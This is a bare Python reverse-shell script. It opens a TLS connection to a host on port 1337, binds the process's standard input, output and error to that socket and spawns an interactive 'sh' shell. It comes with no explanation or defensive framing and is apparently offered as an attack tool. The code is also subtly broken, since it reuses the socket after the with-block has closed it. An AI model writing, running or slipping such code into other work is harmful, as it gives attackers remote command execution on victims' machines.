import socket
import subprocess
import os
import pty
import ssl

hostname = '127.0.0.1'
port = 1337
context = ssl.create_default_context()

with socket.create_connection((hostname, port)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
        print(ssock.version())

os.dup2(ssock.fileno(),0)
os.dup2(ssock.fileno(),1)
os.dup2(ssock.fileno(),2)
pty.spawn("sh")
